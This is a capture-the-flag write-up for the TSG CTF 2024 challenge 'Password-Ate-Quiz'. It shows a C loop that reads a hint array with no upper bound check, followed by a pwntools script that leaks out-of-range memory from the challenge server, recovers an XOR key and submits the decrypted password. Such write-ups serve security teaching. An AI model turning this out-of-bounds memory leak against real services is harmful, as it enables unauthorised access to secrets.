---
title: "Password-Ate-Quiz - TSG CTF 2024"
category: "crypto"
type: "writeup"
tags: ["crypto", "xor", "scanf", "password-ate-quiz", "tsg-ctf", "tsg-ctf-2024", "2024", "ctf-writeup"]
summary: "We notice that there is no check for the index in the source code snippet below"
source:
  name: "CTFtime writeup #39718"
  url: "https://ctftime.org/writeup/39718"
ctf:
  name: "TSG CTF 2024"
  year: 2024
  challenge: "Password-Ate-Quiz"
---

## Metadata

- **CTF:** TSG CTF 2024
- **Task:** Password-Ate-Quiz
- **Author team:** blue-lotus
- **CTFtime:** <https://ctftime.org/writeup/39718>

---
We notice that there is no check for the index in the source code snippet below  
```c  
while (1) {  
int idx;  
printf("Enter a hint number (0~2) > ");  
if (scanf("%d", &idx) == 1 && idx >= 0) {  
for (int i = 0; i < 8; i++) {  
putchar(hints[idx][i]); // 可以 leak  
}  
puts("");  
} else {  
break;  
}  
}  
```  
so we are able to get the encrypted input and password. Through the reverse process of the xor encryption, we are able to get the original password.  
```py  
from pwn import*  
context(arch='amd64', os='linux', log_level='debug')  
p=remote("34.146.186.1",41778)  
# gdb.attach(p)  
# pause()  
p.recvuntil("Enter the password > ")  
p.send("a"*31)  
byte_string = b""  
# get the password  
for i in range(4):  
p.recvuntil("Enter a hint number (0~2) > ")  
p.sendline(str(i+4))  
byte_string += p.recvline().strip().strip(b"\n")

input_string = b""  
for i in range(4):  
p.recvuntil("Enter a hint number (0~2) > ")  
p.sendline(str(i+8))  
input_string += p.recvline().strip().strip(b"\n")

print(input_string)  
print(len(input_string))  
print(byte_string)  
print(len(byte_string))  
# get key  
key = b""  
input = b"a"*31+b"\x00"  
for i in range(3):  
key = (u64(input[i*8:i*8+8].ljust(8, b"\x00")) ^ u64(input_string[i*8:i*8+8].ljust(8, b"\x00"))).to_bytes(8, "little")

print(key)  
print(len(key))  
# get password  
password = b""

for i in range(4):  
password += (u64(key) ^ u64(byte_string[i*8:i*8+8].ljust(8, b"\x00"))).to_bytes(8, "little")  
print(password)  
# find the first null byte  
for i in range(31):  
if password[i] == 0:  
password = password[:i]  
break  
print(password)  
p.recvuntil("Enter a hint number (0~2) > ")  
p.sendline("-1")

p.recvuntil("Enter the password > ")  
p.sendline(password)  
p.interactive()  
```
